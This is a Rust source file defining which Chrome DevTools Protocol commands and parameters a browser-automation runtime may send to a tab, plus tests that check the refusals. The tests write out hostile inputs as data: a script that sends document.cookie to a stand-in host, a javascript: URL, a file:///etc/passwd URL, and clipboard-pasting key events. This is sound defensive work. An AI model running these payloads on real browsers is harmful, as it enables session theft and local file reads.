//! Which CDP commands a tab channel may carry.
//!
//! The same table is enforced by the runtime for both drivers and by the
//! extension on the user's Chrome (defense in depth: `chrome.debugger` also
//! exposes `Network` and `Storage`, i.e. the tab's cookies). Anything not
//! listed is refused before it reaches the browser.

use serde_json::Value;

use crate::scripts;

/// Every command the runtime sends to a tab, with the parameters it may carry.
/// A parameter not listed refuses the whole command: CDP keeps growing, and
/// some parameters are code (`Page.reload`'s `scriptToEvaluateOnLoad` runs a
/// script in every frame), so a method is only as safe as its parameters.
const ALLOWED: &[(&str, &[&str])] = &[
    ("Page.enable", &[]),
    ("Page.setLifecycleEventsEnabled", &["enabled"]),
    ("Page.getFrameTree", &[]),
    ("Page.navigate", &["url"]),
    ("Page.getNavigationHistory", &[]),
    ("Page.navigateToHistoryEntry", &["entryId"]),
    ("Page.createIsolatedWorld", &["frameId", "worldName", "grantUniveralAccess"]),
    ("Page.handleJavaScriptDialog", &["accept", "promptText"]),
    ("Page.captureScreenshot", &["format", "quality"]),
    ("Runtime.enable", &[]),
    ("Runtime.callFunctionOn", &["functionDeclaration", "executionContextId", "arguments", "returnByValue", "awaitPromise"]),
    ("Input.dispatchMouseEvent", &["type", "x", "y", "button", "buttons", "clickCount", "deltaX", "deltaY", "modifiers"]),
    (
        "Input.dispatchKeyEvent",
        &["type", "key", "code", "windowsVirtualKeyCode", "nativeVirtualKeyCode", "text", "unmodifiedText", "modifiers", "commands"],
    ),
    ("Input.insertText", &["text"]),
    ("Emulation.setFocusEmulationEnabled", &["enabled"]),
    ("Emulation.setDeviceMetricsOverride", &["width", "height", "deviceScaleFactor", "mobile"]),
];

/// http(s) or about:blank — never `javascript:`, `file:`, `chrome:` or `data:`.
pub fn is_web_url(url: &str) -> bool {
    url == "about:blank" || url.starts_with("http://") || url.starts_with("https://")
}

/// The keys the runtime presses, with their virtual key codes.
const KEYS: &[(&str, i64)] = &[("Enter", 13), ("Escape", 27), ("Tab", 9), ("Backspace", 8), ("ArrowDown", 40), ("ArrowUp", 38)];

/// Exactly the key events the runtime sends: those keys with no modifier,
/// and "a" only as the Cmd/Ctrl-held half of select-all. Anything else can
/// reach the clipboard without a `paste` command — Ctrl+V, Shift+Insert.
fn check_key_event(p: &Value) -> Result<(), String> {
    let refuse = |why: &str| Err(format!("Input.dispatchKeyEvent: {why}"));
    if !matches!(p.get("type").and_then(Value::as_str), Some("keyDown" | "keyUp")) {
        return refuse("only keyDown and keyUp");
    }
    if p.get("commands").is_some_and(|c| c != &serde_json::json!(["selectAll"])) {
        return refuse("only the selectAll command");
    }
    let key = p.get("key").and_then(Value::as_str).unwrap_or("");
    let modifiers = p.get("modifiers").and_then(Value::as_i64).unwrap_or(0);
    let vk_is = |want: i64| {
        ["windowsVirtualKeyCode", "nativeVirtualKeyCode"].iter().all(|k| p.get(*k).is_none_or(|v| v.as_i64() == Some(want)))
    };
    let text_is = |allowed: &str| {
        ["text", "unmodifiedText"].iter().all(|k| p.get(*k).is_none_or(|v| v.as_str().is_some_and(|t| t.is_empty() || t == allowed)))
    };
    if key == "a" {
        let select_all = matches!(modifiers, 2 | 4) && vk_is(65) && text_is("") && p.get("code").is_none_or(|c| c == "KeyA");
        return if select_all { Ok(()) } else { refuse("\"a\" only as select-all") };
    }
    let Some((_, vk)) = KEYS.iter().find(|(k, _)| *k == key) else {
        return refuse(&format!("the runtime never presses `{key}`"));
    };
    if modifiers != 0 || p.get("commands").is_some() {
        return refuse("no modifier keys");
    }
    if !vk_is(*vk) || p.get("code").is_some_and(|c| c.as_str() != Some(key)) {
        return refuse("the key code does not match the key");
    }
    if !text_is(if key == "Enter" { "\r" } else { "" }) {
        return refuse("no text");
    }
    Ok(())
}

/// Left button only, no modifier keys: a middle click pastes the selection
/// on Linux, and modifier clicks open tabs the runtime does not own.
fn check_mouse_event(p: &Value) -> Result<(), String> {
    if !matches!(p.get("button").and_then(Value::as_str).unwrap_or("none"), "none" | "left") {
        return Err("Input.dispatchMouseEvent: left button only".into());
    }
    if p.get("buttons").is_some_and(|b| !matches!(b.as_i64(), Some(0 | 1))) {
        return Err("Input.dispatchMouseEvent: left button only".into());
    }
    if p.get("modifiers").is_some_and(|m| m.as_i64() != Some(0)) {
        return Err("Input.dispatchMouseEvent: no modifier keys".into());
    }
    Ok(())
}

/// `Ok(())` when `method` with `params` may be sent to a tab.
pub fn check(method: &str, params: &Value) -> Result<(), String> {
    let Some((_, keys)) = ALLOWED.iter().find(|(m, _)| *m == method) else {
        return Err(format!("{method} is not on the allowlist"));
    };
    if let Some(obj) = params.as_object() {
        if let Some(extra) = obj.keys().find(|k| !keys.contains(&k.as_str())) {
            return Err(format!("{method} may not carry `{extra}`"));
        }
    } else if !params.is_null() {
        return Err(format!("{method} takes an object of parameters"));
    }
    match method {
        "Runtime.callFunctionOn" => {
            if params.get("executionContextId").and_then(Value::as_i64).is_none() {
                return Err("Runtime.callFunctionOn needs an executionContextId".into());
            }
            let declaration = params.get("functionDeclaration").and_then(Value::as_str).unwrap_or("");
            if !scripts::is_allowed(declaration) {
                return Err("Runtime.callFunctionOn with a script that is not in the approved bundle".into());
            }
        }
        "Page.navigate" => {
            if !params.get("url").and_then(Value::as_str).is_some_and(is_web_url) {
                return Err("Page.navigate is allowed to http(s) and about:blank only".into());
            }
        }
        "Page.createIsolatedWorld" if params.get("grantUniveralAccess").and_then(Value::as_bool) == Some(true) => {
            return Err("Page.createIsolatedWorld without universal access only".into());
        }
        // `commands` runs editing commands; only "select all" (to replace a
        // field's text) is needed, never paste (the clipboard).
        "Input.dispatchKeyEvent" => check_key_event(params)?,
        "Input.dispatchMouseEvent" => check_mouse_event(params)?,
        _ => {}
    }
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;
    use serde_json::json;

    #[test]
    fn cookies_storage_and_arbitrary_js_are_refused() {
        assert!(check("Network.getCookies", &json!({})).is_err());
        assert!(check("Storage.getCookies", &json!({})).is_err());
        assert!(check("Runtime.evaluate", &json!({"expression": "document.cookie"})).is_err());
        assert!(check("Page.addScriptToEvaluateOnNewDocument", &json!({"source": "1"})).is_err());
        assert!(check("DOM.setFileInputFiles", &json!({})).is_err());
    }

    #[test]
    fn only_approved_scripts_run_and_only_in_a_context() {
        let ok = json!({ "functionDeclaration": scripts::GUARD.declaration(), "executionContextId": 7 });
        assert!(check("Runtime.callFunctionOn", &ok).is_ok());
        let foreign = json!({ "functionDeclaration": "function () { return document.cookie; }", "executionContextId": 7 });
        assert!(check("Runtime.callFunctionOn", &foreign).is_err());
        let on_object = json!({ "functionDeclaration": scripts::GUARD.declaration(), "objectId": "1.2.3" });
        assert!(check("Runtime.callFunctionOn", &on_object).is_err());
    }

    #[test]
    fn input_and_page_basics_pass() {
        assert!(check("Input.dispatchMouseEvent", &json!({"type": "mousePressed"})).is_ok());
        assert!(check("Input.insertText", &json!({"text": "x"})).is_ok());
        assert!(check("Page.navigate", &json!({"url": "https://example.com"})).is_ok());
        assert!(check("Page.setLifecycleEventsEnabled", &json!({"enabled": true})).is_ok());
        assert!(check("Target.setAutoAttach", &json!({"flatten": false})).is_err());
    }

    #[test]
    fn parameters_that_carry_code_or_reach_further_are_refused() {
        // A reload that injects a script into every frame.
        assert!(check("Page.reload", &json!({"scriptToEvaluateOnLoad": "fetch('https://x.test/'+document.cookie)"})).is_err());
        assert!(check("Page.navigate", &json!({"url": "https://example.com", "transitionType": "link", "referrer": "x"})).is_err());
        assert!(check("Page.navigate", &json!({"url": "javascript:alert(1)"})).is_err());
        assert!(check("Page.navigate", &json!({"url": "file:///etc/passwd"})).is_err());
        assert!(check("Input.dispatchKeyEvent", &json!({"type": "keyDown", "commands": ["paste"]})).is_err());
        assert!(check("Input.dispatchKeyEvent", &json!({"type": "keyDown", "key": "a", "modifiers": 4, "commands": ["selectAll"]})).is_ok());
        assert!(check("Page.createIsolatedWorld", &json!({"frameId": "F", "grantUniveralAccess": true})).is_err());
        for unused in ["DOMSnapshot.captureSnapshot", "Accessibility.getFullAXTree", "Page.startScreencast", "DOM.resolveNode", "Target.setAutoAttach"] {
            assert!(check(unused, &json!({})).is_err(), "{unused}");
        }
    }

    /// The clipboard is reachable without a `paste` command: the shortcut
    /// keys and a middle click paste on their own.
    #[test]
    fn keys_and_clicks_that_paste_are_refused() {
        let key = |p: Value| check("Input.dispatchKeyEvent", &p);
        assert!(key(json!({"type": "keyDown", "key": "v", "code": "KeyV", "windowsVirtualKeyCode": 86, "modifiers": 2})).is_err(), "Ctrl+V");
        assert!(key(json!({"type": "keyDown", "key": "v", "code": "KeyV", "modifiers": 4})).is_err(), "Cmd+V");
        assert!(key(json!({"type": "keyDown", "key": "Insert", "code": "Insert", "windowsVirtualKeyCode": 45, "modifiers": 8})).is_err(), "Shift+Insert");
        assert!(key(json!({"type": "keyDown", "key": "Enter", "code": "Enter", "windowsVirtualKeyCode": 86, "modifiers": 2})).is_err(), "Ctrl+V as Enter");
        assert!(key(json!({"type": "keyDown", "key": "Enter", "code": "Enter", "windowsVirtualKeyCode": 13, "modifiers": 2})).is_err(), "Ctrl+Enter");
        assert!(key(json!({"type": "keyDown", "key": "a", "code": "KeyA", "modifiers": 4, "commands": ["paste"]})).is_err());
        assert!(key(json!({"type": "char", "text": "x"})).is_err());
        let mouse = |p: Value| check("Input.dispatchMouseEvent", &p);
        assert!(mouse(json!({"type": "mousePressed", "x": 1, "y": 1, "button": "middle", "buttons": 4, "clickCount": 1})).is_err());
        assert!(mouse(json!({"type": "mousePressed", "x": 1, "y": 1, "button": "left", "buttons": 1, "clickCount": 1, "modifiers": 4})).is_err());
    }

    /// Every key and mouse event the runtime itself sends (tab.rs) still passes.
    #[test]
    fn the_runtimes_own_input_passes() {
        for mods in [2, 4] {
            assert!(check("Input.dispatchKeyEvent", &json!({ "type": "keyDown", "key": "a", "code": "KeyA", "modifiers": mods, "commands": ["selectAll"] })).is_ok());
            assert!(check("Input.dispatchKeyEvent", &json!({ "type": "keyUp", "key": "a", "code": "KeyA", "modifiers": mods })).is_ok());
        }
        for (key, vk) in KEYS {
            let mut down = json!({ "type": "keyDown", "key": key, "code": key, "windowsVirtualKeyCode": vk, "nativeVirtualKeyCode": vk });
            if *key == "Enter" {
                down["text"] = json!("\r");
                down["unmodifiedText"] = json!("\r");
            }
            assert!(check("Input.dispatchKeyEvent", &down).is_ok(), "{key}");
            let up = json!({ "type": "keyUp", "key": key, "code": key, "windowsVirtualKeyCode": vk, "nativeVirtualKeyCode": vk });
            assert!(check("Input.dispatchKeyEvent", &up).is_ok(), "{key}");
        }
        for ev in [
            json!({ "type": "mouseMoved", "x": 1, "y": 2 }),
            json!({ "type": "mousePressed", "x": 1, "y": 2, "button": "left", "buttons": 1, "clickCount": 1 }),
            json!({ "type": "mouseReleased", "x": 1, "y": 2, "button": "left", "buttons": 0, "clickCount": 1 }),
            json!({ "type": "mouseWheel", "x": 1, "y": 2, "deltaX": 0, "deltaY": 560 }),
        ] {
            assert!(check("Input.dispatchMouseEvent", &ev).is_ok(), "{ev}");
        }
    }
}
